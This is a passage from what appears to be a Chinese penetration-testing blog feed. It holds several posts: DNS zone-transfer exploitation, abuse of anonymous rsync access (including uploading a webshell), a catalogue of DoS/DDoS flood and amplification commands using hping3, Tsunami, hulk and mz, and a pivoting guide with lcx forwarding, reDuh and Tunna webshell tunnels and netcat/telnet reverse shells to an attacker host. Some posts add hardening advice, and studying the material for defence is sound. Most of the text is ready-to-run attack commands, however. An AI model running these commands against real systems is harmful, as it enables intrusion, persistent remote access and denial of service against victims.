<h2 id="攻击方式及危害"><a href="#攻击方式及危害" class="headerlink" title="攻击方式及危害"></a>攻击方式及危害</h2><p>恶意用户可以通过dns域传送获取被攻击域下所有的子域名。会导致一些非公开域名（测试域名、内部域名）泄露。而泄露的类似内部域名，其安全性相对较低，更容易遭受攻击者的攻击，比较典型的譬如内部的测试机往往就会缺乏必要的安全设置。</p>
<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><h3 id="window利用方式"><a href="#window利用方式" class="headerlink" title="window利用方式"></a>window利用方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nslookup</div><div class="line">server dns.xx.com</div><div class="line">ls xx.com</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/dns.jpg" alt=""></p>
<h3 id="linux利用方式"><a href="#linux利用方式" class="headerlink" title="linux利用方式"></a>linux利用方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dig @dns.xx.com. axfr xx.com</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/dns2.jpg" alt=""></p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>解决域传送问题非常简单，只需要在相应的zone、options中添加allow-transfer限制可以进行同步的服务器就可以了，可以有两种方式：限制IP、使用key认证。</p>
<p>参考链接：<br><a href="http://wooyun.jozxing.cc/static/drops/papers-64.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/papers-64.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
    
    
  </entry>
  
  <entry>
    <title>配置漏洞之Rsync匿名访问</title>
    <link href="http://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BRsync%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE.html"/>
    <id>http://uknowsec.cn/posts/skill/配置漏洞之Rsync匿名访问.html</id>
    <published>2017-07-12T07:24:00.000Z</published>
    <updated>2017-07-12T08:14:11.816Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="Rsync简介"><a href="#Rsync简介" class="headerlink" title="Rsync简介"></a>Rsync简介</h2><p>Rsync，remote synchronize顾名思意就知道它是一款实现远程同步功能的软件，它在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。</p>
<p>rsync是用 “rsync 算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，而且可以通过ssh方式来传输文件，这样其保密性也非常好，另外它还是免费的软件。</p>
<p>rsync 包括如下的一些特性：</p>
<ul>
<li>能更新整个目录和树和文件系统；</li>
<li>有选择性的保持符号链链、硬链接、文件属于、权限、设备以及时间等；</li>
<li>对于安装来说，无任何特殊权限要求；</li>
<li>对于多个文件来说，内部流水线减少文件等待的延时；</li>
<li>能用rsh、ssh 或直接端口做为传输入端口；</li>
<li>支持匿名rsync 同步文件，是理想的镜像工具；</li>
</ul>
<h2 id="寻找匿名访问Rsync方式"><a href="#寻找匿名访问Rsync方式" class="headerlink" title="寻找匿名访问Rsync方式"></a>寻找匿名访问Rsync方式</h2><p>Rsync默认的端口是873，可以使用nmap扫描哪些ip开放了873端口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -n --open -p 873 X.X.X.X/24</div></pre></td></tr></table></figure></p>
<h2 id="漏洞利用常用操作"><a href="#漏洞利用常用操作" class="headerlink" title="漏洞利用常用操作"></a>漏洞利用常用操作</h2><h3 id="例举整个同步目录或指定目录"><a href="#例举整个同步目录或指定目录" class="headerlink" title="例举整个同步目录或指定目录"></a>例举整个同步目录或指定目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rsync 10.0.0.12::</div><div class="line">rsync 10.0.0.12::www/</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync1.jpg" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync2.jpg" alt=""></p>
<h3 id="下载文件或目录到本地"><a href="#下载文件或目录到本地" class="headerlink" title="下载文件或目录到本地"></a>下载文件或目录到本地</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rsync -avz 10.0.0.12::www/test.php /root</div><div class="line">rsync -avz 10.0.0.12::www/ /var/tmp</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync3.jpg" alt=""></p>
<h3 id="上传本地文件到服务端"><a href="#上传本地文件到服务端" class="headerlink" title="上传本地文件到服务端"></a>上传本地文件到服务端</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rsync -avz webshell.php 10.0.0.12::www/</div></pre></td></tr></table></figure>
<h2 id="漏洞利用实例"><a href="#漏洞利用实例" class="headerlink" title="漏洞利用实例"></a>漏洞利用实例</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync.jpg" alt=""></p>
<h2 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h2><p>Metasploit中关于允许匿名访问的rsync扫描模块：<br>auxiliary/scanner/rsync/modules_list</p>
<p>针对rsync口令暴力破解的脚本rsync-brute:<br><a href="https://svn.nmap.org/nmap/scripts/rsync-brute.nse" target="_blank" rel="external">https://svn.nmap.org/nmap/scripts/rsync-brute.nse</a></p>
<h2 id="安全配置注意事项"><a href="#安全配置注意事项" class="headerlink" title="安全配置注意事项"></a>安全配置注意事项</h2><p>注意两种方式防御，一是限定访问的IP，另一个是不允许匿名访问，添加用户口令。</p>
<h3 id="限定IP的两种方式"><a href="#限定IP的两种方式" class="headerlink" title="限定IP的两种方式"></a>限定IP的两种方式</h3><p>IPTables防火墙</p>
<p>给rsync的端口添加一个iptables。</p>
<p>只希望能够从内部网络（192.168.101.0/24）访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT</div><div class="line">iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT</div></pre></td></tr></table></figure>
<p>除此之外rsyncd.conf中的hosts allow也可以设置只允许来源ip。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hosts allow = X.X.X.X #允许访问的IP</div></pre></td></tr></table></figure>
<h3 id="添加用户口令"><a href="#添加用户口令" class="headerlink" title="添加用户口令"></a>添加用户口令</h3><p>添加rsync用户权限访问，注意配置的是rsyncd.conf中的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">secrets file = /etc/rsyncd.secrets #密码文件位置，认证文件设置，设置用户名和密码</div><div class="line">auth users = rsync #授权帐号,认证的用户名，如果没有这行则表明是匿名，多个用户用,分隔。</div></pre></td></tr></table></figure>
<p>参考链接：<br><a href="http://wooyun.jozxing.cc/static/drops/papers-161.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/papers-161.html</a><br><a href="http://www.91ri.org/11093.html" target="_blank" rel="external">http://www.91ri.org/11093.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
    
    
  </entry>
  
  <entry>
    <title>浅谈ddos的测试方法</title>
    <link href="http://uknowsec.cn/posts/skill/%E6%B5%85%E8%B0%88ddos%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html"/>
    <id>http://uknowsec.cn/posts/skill/浅谈ddos的测试方法.html</id>
    <published>2017-07-12T06:22:32.000Z</published>
    <updated>2017-07-13T01:00:54.056Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<p>DOS（denial of service–拒绝服务）攻击的目的是使服务正常功能不可用。不像其他类型的攻击的目的是获取敏感信息，Dos攻击是不会威胁到敏感信息而是使合法用户不能使用服务。有时候Dos在其他攻击中也会存在一定的作用，比如使web应用防火墙拒绝服务，从而绕过防火墙。</p>
<h2 id="DOS与DDOS的区别"><a href="#DOS与DDOS的区别" class="headerlink" title="DOS与DDOS的区别"></a>DOS与DDOS的区别</h2><p>Dos是拒绝服务攻击，而DDOS是分布式拒绝服务攻击；Dos与DDOS都是攻击目标服务器、网络服务的一种方式。Dos是利用自己的计算机攻击目标，也是一对一的关系，而DDOS是DoS攻击基础之上产生的一种新的攻击方式,利用控制成百上千台肉鸡，组成一个DDOS攻击群，同一时刻对目标发起攻击。</p>
<p>从理论上来说，无论目标服务器、网络服务的资源多大，也是带宽、内存、CPU多大，都无法避免Dos与DDOS攻击，因此任何资源再大也有一个极限值，比如说，一台服务器每秒可以处理1000个数据包，而通过DOS攻击给这台服务器发送1001个数据包，这时服务器无法正常运行，需要给服务器扩容。 从技术上来说，DOS和DDOS都是攻击目标服务器的带宽和连通性，使得目标服务器的带宽资源耗尽，无法正常运行。</p>
<h2 id="DOS的类型"><a href="#DOS的类型" class="headerlink" title="DOS的类型"></a>DOS的类型</h2><p>Dos是拒绝服务攻击，而DDOS是分布式拒绝服务攻击；Dos与DDOS都是攻击目标服务器、网络服务的一种方式。Dos是利用自己的计算机攻击目标，也是一对一的关系，而DDOS是DoS攻击基础之上产生的一种新的攻击方式,利用控制成百上千台肉鸡，组成一个DDOS攻击群，同一时刻对目标发起攻击。</p>
<p>从理论上来说，无论目标服务器、网络服务的资源多大，也是带宽、内存、CPU多大，都无法避免Dos与DDOS攻击，因此任何资源再大也有一个极限值，比如说，一台服务器每秒可以处理1000个数据包，而通过DOS攻击给这台服务器发送1001个数据包，这时服务器无法正常运行，需要给服务器扩容。 从技术上来说，DOS和DDOS都是攻击目标服务器的带宽和连通性，使得目标服务器的带宽资源耗尽，无法正常运行。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos.jpg" alt=""></p>
<h2 id="网络和传输层攻击"><a href="#网络和传输层攻击" class="headerlink" title="网络和传输层攻击"></a>网络和传输层攻击</h2><p>这种攻击方式通常是向服务器发送恶意流量，尽可能消耗服务器的资源来达到拒绝服务的目的。</p>
<h3 id="TCP-SYN-floods"><a href="#TCP-SYN-floods" class="headerlink" title="TCP SYN floods"></a>TCP SYN floods</h3><p>SYN洪水攻击在传输层，为了更好的理解这种类型的攻击，我们需要先了解TCP的三次握手。</p>
<p>先来看张图如下：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos1.jpg" alt=""></p>
<p>对照上图来理解一下：</p>
<p>第一次握手：建立连接。客户端发送连接请求报文段，将SYN位置为1，Sequence Number为x；然后，客户端进入SYN_SEND状态，等待服务器的确认；</p>
<p>第二次握手：服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为x+1(Sequence Number+1)；同时，自己自己还要发送SYN请求信息，将SYN位置为1，Sequence Number为y；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RECV状态；</p>
<p>第三次握手：客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为y+1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。 完成了三次握手，客户端和服务器端就可以开始传送数据。</p>
<p>如果攻击者发送足够的SYN数据包，因为服务器的并发TCP连接数量有限所以会导致服务器没有更多的资源可用。 如果服务器达到限制，在现有的处于SYN-RCVD状态的连接超时之前则不能在建立新的连接，这就造成了拒绝服务攻击。</p>
<p>SYN洪水攻击测试工具，我们可以用hping3，下载地址：<a href="http://www.hping.org/hping3.html" target="_blank" rel="external">http://www.hping.org/hping3.html</a></p>
<p>命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 简单例子： hping3 -S --flood -V -p TARGET_PORT TARGET_SITE</div><div class="line"></div><div class="line">2 随机源IP： hping3 -c 20000 -d 120 -S -w 64 -p TARGET_PORT --flood --rand-source TARGET_SITE</div></pre></td></tr></table></figure>
<h3 id="UDP-floods"><a href="#UDP-floods" class="headerlink" title="UDP floods"></a>UDP floods</h3><p>UDP协议是无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。</p>
<p>由于UDP协议是无连接性的，所以只要开了一个UDP的端口提供相关服务的话，那么就可针对相关的服务进行攻击。这种攻击的原理是通过伪造的IP向目标服务器发送大量的UDP数据包，服务器在接收到数据包后无法处理每一条请求，并且通过向服务器发送ICMP “destination unreachable”来消耗其带宽。</p>
<p>测试工具：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 hping3 命令：hping3 --flood --rand-source --udp -p TARGET_PORT TARGET_IP</div><div class="line"></div><div class="line">2 loic 下载地址： https://sourceforge.net/projects/loic/</div></pre></td></tr></table></figure>
<h3 id="TCP-FIN-Flood"><a href="#TCP-FIN-Flood" class="headerlink" title="TCP FIN Flood"></a>TCP FIN Flood</h3><p>这种FIM标志的数据包只有在TCP建立连接之后才会被接受，如果没有建立TCP连接，那么这个标志的数据包将会被简单的删除处理。</p>
<p>如果攻击者只是在没有建立TCP连接的情况下对服务器进行泛洪攻击，那么FIN数据包将会别丢弃，但是服务器还是会分配一些资源来查看数据包防止冗余。</p>
<p>这种攻击很容易被实现。</p>
<p>测试工具：hping3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --flood --rand-source -F -p TARGET_PORT TARGET_IP</div></pre></td></tr></table></figure>
<h3 id="TCP-RST-Flood"><a href="#TCP-RST-Flood" class="headerlink" title="TCP RST Flood"></a>TCP RST Flood</h3><p>TCP中的RST包的意思是立即断开连接，当连接出错需要停止掉的时候非常有用。</p>
<p>如果攻击者能够以某种方式查看从源到目的地的流量，则可以发送具有适当值的RST报文（源IP，目的IP，源端口，目的端口，序列号等），该报文将断开源和目的地之间的TCP连接。 这也是一种拒绝服务的方式。</p>
<p>RST泛洪的测试工具也是hping3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --flood --rand-source -R -p TARGET_PORT TARGET_IP</div></pre></td></tr></table></figure>
<h3 id="PUSH-and-ACK-Flood"><a href="#PUSH-and-ACK-Flood" class="headerlink" title="PUSH and ACK Flood"></a>PUSH and ACK Flood</h3><p>通过大量的PUSH和ACK泛洪可以是服务器停止对正常用户的请求进行响应。</p>
<p>测试工具：hping3 和 LOIC</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --flood --rand-source -PA -p TARGET_PORT TARGET_IP</div></pre></td></tr></table></figure>
<h3 id="ICMP-and-IGMP-Floods"><a href="#ICMP-and-IGMP-Floods" class="headerlink" title="ICMP and IGMP Floods"></a>ICMP and IGMP Floods</h3><p>ICMP（Internet Control Message Protocol–Internet控制消息协议）和IGMP（Internet Group Management Protocol–Internet组管理协议）是网络层的协议类似于UDP。ICMP递送状态消息，错误报告，回答某些请求，报告路由信息，并且常用于测试网络的连通性和排查问题。IGMP是IP网络上的系统和相邻路由用来建立和维护多播组成员关系的协议。</p>
<p>ICMP and IGMP Floods类似于UDP不需要任何漏洞，只需要发送大量的ICMP或IGMP数据包，在处理每一个数据包的时候资源消耗殆尽导致拒绝服务。</p>
<p>测试工具：hping3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --flood --rand-source -1 -p TARGET_PORT TARGET_IP</div></pre></td></tr></table></figure>
<h2 id="放大攻击"><a href="#放大攻击" class="headerlink" title="放大攻击"></a>放大攻击</h2><p>利用回复包比请求包大的特点（放大流量），伪造请求包的源IP地址，将应答包引向被攻击的目标。例如：攻击者伪造源IP为目标的IP然后使用路由广播IP地址向多个IP发送消息，然后这些设备都向目标IP进行回应。如图：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos2.jpg" alt=""></p>
<p>想要使用放大攻击必须使用不需要验证源IP的无连接协议，像DNS、ICMP（ Smurf attack）、UDP（Fraggle attack）等协议。</p>
<h3 id="Smurf-Attack"><a href="#Smurf-Attack" class="headerlink" title="Smurf Attack"></a>Smurf Attack</h3><p>攻击者会选择一些中间站点作为放大器，然后发送巨大数量ICMP（ping）请求到这些中间站点的广播IP。通过这种方式，将所有的源IP改为目标的IP地址，这些中间地址将这些数据包广播到所有子网的主机。最后所有主机的回应都发回给目标。</p>
<p>测试工具:hping3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：hping3 --icmp --spoof TARGET_IP BROADCAST_IP</div></pre></td></tr></table></figure>
<h3 id="DNS-Amplification"><a href="#DNS-Amplification" class="headerlink" title="DNS Amplification"></a>DNS Amplification</h3><p>当前许多DNS服务器支持EDNS。EDNS是DNS的一套扩大机制，RFC 2671对此有介绍。一些选择能够让DNS回复超过512字节并且仍然使用UDP，如果要求者指出它能够处理这样大的DNS查询的话。攻击者已经利用这种方法产生了大量的通讯。通过发送一个60个字节的查询来获取一个大约4000个字节的记录，攻击者能够把通讯量放大66倍。一些这种性质的攻击已经产生了 每秒钟许多GB的通讯量，对于某些目标的攻击甚至超过了每秒钟10GB的通讯量。<br>下面看两个图，正常的查询:</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos3.jpg" alt=""></p>
<p>下面是放大攻击的图：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ddos4.jpg" alt=""></p>
<p>对比上面的连个图，发下放大攻击之后有大量的数据查询后的响应数据包返回给受害者的机器，这样就造成了对受害者的拒绝服务攻击。</p>
<p>测试工具：Tsunami</p>
<p>下载地址： <a href="https://www.infosec-ninjas.com/tsunami" target="_blank" rel="external">https://www.infosec-ninjas.com/tsunami</a></p>
<p>测试命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 收集dns服务器 ./tsunami -o recursive_dns.txt -l 4 -e 172.0.0.0/8</div><div class="line"></div><div class="line">2 对目标进行攻击 ./tsunami -s TARGET_IP -n pentest.blog -p 3 -f recursive_dns.txt</div></pre></td></tr></table></figure>
<h3 id="Fraggle-Attack"><a href="#Fraggle-Attack" class="headerlink" title="Fraggle Attack"></a>Fraggle Attack</h3><p>攻击者向UDP端点发送大量的欺骗UDP洪促使这些端口回应目标。</p>
<h2 id="应用层攻击"><a href="#应用层攻击" class="headerlink" title="应用层攻击"></a>应用层攻击</h2><p>应用层攻击也叫第七层攻击，可以实行DoS和DDoS攻击，这种类型的攻击是基于模仿人的行为。</p>
<p>可能被利用的协议包括HTTP、HTTPS、DNS、SMTP、FTP、VOIP和其他的应用协议</p>
<h3 id="HTTP泛洪"><a href="#HTTP泛洪" class="headerlink" title="HTTP泛洪"></a>HTTP泛洪</h3><p>HTTP泛洪是应用层攻击中最常见的攻击方式。</p>
<p>这种类型的攻击可以尝试使用HTTP GET或者POST方式向服务器发出请求。通常来说需要多个电脑同时发出请求。</p>
<p>测试工具：</p>
<p>1 LOIC</p>
<p>2 hulk <a href="http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/" target="_blank" rel="external">http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令:python hulk.py -site http://TARGET.com/test/</div></pre></td></tr></table></figure>
<p>3 Apache JMeter <a href="https://jmeter.apache.org/" target="_blank" rel="external">https://jmeter.apache.org/</a></p>
<h3 id="DNS泛洪"><a href="#DNS泛洪" class="headerlink" title="DNS泛洪"></a>DNS泛洪</h3><p>DNS泛洪像其他洪水攻击一样，DNS泛宏攻击的目的是向DNS应用发送大量DNS请求。DNS服务器不堪重负，无法处理来自其他用户的所有合法请求。</p>
<p>测试工具：</p>
<p>1 mz <a href="http://www.perihel.at/sec/mz/" target="_blank" rel="external">http://www.perihel.at/sec/mz/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：mz -A rand -B TARGET_DNS_SERVER -t dns &quot;q=pentest.blog&quot; -c 10000000</div></pre></td></tr></table></figure>
<p>2 netstressng <a href="https://sourceforge.net/projects/netstressng/" target="_blank" rel="external">https://sourceforge.net/projects/netstressng/</a></p>
<p>命令：netstress.fullrandom -d TARGET_DNS_SERVER -a dns -t a -n 4 -P 53</p>
<h3 id="Low和Slow攻击"><a href="#Low和Slow攻击" class="headerlink" title="Low和Slow攻击"></a>Low和Slow攻击</h3><p>这个攻击不像其他的泛洪攻击，他不需要大量的数据流量。这种类型的攻击针对的是应用程序和服务器资源。</p>
<p>这种方式很难被检测，因为其流量跟正常流量没什么两样。</p>
<p>测试工具：<a href="https://github.com/llaera/slowloris.pl" target="_blank" rel="external">https://github.com/llaera/slowloris.pl</a></p>
<p>这个工具的原理就是通过打开多个连接并保持连接，直到服务器无法处理跟多的http请求，导致拒绝服务。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里说了这么多关于拒绝服务的方式，我知道这些内容并不是很全，而且解释的也比较简单，没有深入去解释各种协议，这些基础的东西就需要大家自行去研究学习。这里只是做一个简要介绍做个笔记。里面涉及的攻击就只能请大家自行测试了 。</p>
<p>原文链接：<a href="https://mp.weixin.qq.com/s/zH_1rHVP2-m-5yhtEGvNCw" target="_blank" rel="external">https://mp.weixin.qq.com/s/zH_1rHVP2-m-5yhtEGvNCw</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透中转发工具总结</title>
    <link href="http://uknowsec.cn/posts/notes/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93.html"/>
    <id>http://uknowsec.cn/posts/notes/内网渗透中转发工具总结.html</id>
    <published>2017-07-11T07:03:36.000Z</published>
    <updated>2017-07-12T02:53:33.949Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="LCX转发"><a href="#LCX转发" class="headerlink" title="LCX转发"></a>LCX转发</h2><p>本机：192.168.1.110<br>靶机：192.168.1.128</p>
<p>首先远程目标系统要开启远程访问功能（若未开可通过开3389命令开启）.</p>
<p>lcx.exe是个端口转发工具，相当于把肉鸡A上的3389端口转发到B机上，当然这个B机必须有外网IP。这样链接B机的3389端口就相当于链接A机的3389。</p>
<p>首先在本地进行监听，监听51端口并转发到33891端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx.exe -listen 51 33891</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/lcx1.png" alt=""></p>
<p>内网机器上执行：lcx.exe –slave 公网IP +端口 内网IP +端口</p>
<p>将内网(192.168.1.128)的3389端口转发到公网(192.168.1.110)的51端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx.exe –slave 192.168.1.110 51 192.168.1.128 3389</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/lcx2.png" alt=""></p>
<p>远程桌面访问33891端口</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/lcx3.png" alt=""></p>
<h2 id="NC转发"><a href="#NC转发" class="headerlink" title="NC转发"></a>NC转发</h2><p>本机：192.168.1.125<br>靶机：192.168.1.128</p>
<h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>在靶机上<br><img src="http://obr4sfdq7.bkt.clouddn.com/nc1.png" alt=""></p>
<p>在本机上操作，并成功获得一个远程机器的shell<br><img src="http://obr4sfdq7.bkt.clouddn.com/nc2.png" alt=""></p>
<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>在本机运行上<br><img src="http://obr4sfdq7.bkt.clouddn.com/nc3.png" alt=""></p>
<p>在远程机器上，然后成功之后，在本地机器上获得一个远程机器的cmdshell<br><img src="http://obr4sfdq7.bkt.clouddn.com/nc4.png" alt=""></p>
<h2 id="Redduh内网反弹"><a href="#Redduh内网反弹" class="headerlink" title="Redduh内网反弹"></a>Redduh内网反弹</h2><p>本机：192.168.1.110<br>靶机：192.168.1.128</p>
<p>服务端是个webshell（针对不同服务器有aspx,php,jsp三个版本），客户端是java写的，本地要安装jdk。</p>
<p>这里我们以php网站为例，首先将php文件上传到服务器端。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/reDuh1.png" alt=""></p>
<p>浏览器中访问上传的webshell，提示以下内容说明解析成功<br><img src="http://obr4sfdq7.bkt.clouddn.com/reDuh2.png" alt=""></p>
<p>用客户端连接服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar reDuhClient.jar http://192.168.1.125/reDuh.php</div></pre></td></tr></table></figure></p>
<p>本地连接1010端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc.exe -vv localhost 1010</div><div class="line">[createTunnel]1235:127.0.0.1:3389</div></pre></td></tr></table></figure></p>
<p>远程登录<br><img src="http://obr4sfdq7.bkt.clouddn.com/tunna3.png" alt=""></p>
<h2 id="Tunna内网反弹"><a href="#Tunna内网反弹" class="headerlink" title="Tunna内网反弹"></a>Tunna内网反弹</h2><p>靶机：192.168.1.137<br>本机：192.168.1.110</p>
<p>以下为后门文件，该工具是Python所写，需要Python环境，同样有jsp、aspx、php版本的webshell<br><img src="http://obr4sfdq7.bkt.clouddn.com/tunna0.png" alt=""></p>
<p>这里使用php网站进行测试，上传php后门<br><img src="http://obr4sfdq7.bkt.clouddn.com/tunna2.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python proxy.py -u http://192.168.1.137/conn.php -l 1234 -r 3389 -v –s</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/tunna4.png" alt=""></p>
<p>远程连接<br><img src="http://obr4sfdq7.bkt.clouddn.com/tunna3.png" alt=""></p>
<h2 id="Linux系统通过nc反弹shell"><a href="#Linux系统通过nc反弹shell" class="headerlink" title="Linux系统通过nc反弹shell"></a>Linux系统通过nc反弹shell</h2><p>本机：192.168.1.117<br>靶机：192.168.1.116</p>
<p>首先，攻击端进行监听</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc.exe -lvnp 2333</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc1.png" alt=""></p>
<p>服务端执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mknod /tmp/backpipe p</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/sh 0&lt;/tmp/backpipe | nc 192.168.1.117 2333 1&gt;/tmp/backpipe</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc3.png" alt=""></p>
<p>执行命令，查看发现反弹成功<br><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc2.png" alt=""></p>
<h2 id="内置命令反弹"><a href="#内置命令反弹" class="headerlink" title="内置命令反弹"></a>内置命令反弹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc.exe -lvnp 2333</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc1.png" alt=""></p>
<p>服务器端执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod /tmp/backpipe p</div><div class="line">telnet 192.168.1.117 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc4.png" alt=""></p>
<p>反弹成功<br><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc2.png" alt=""></p>
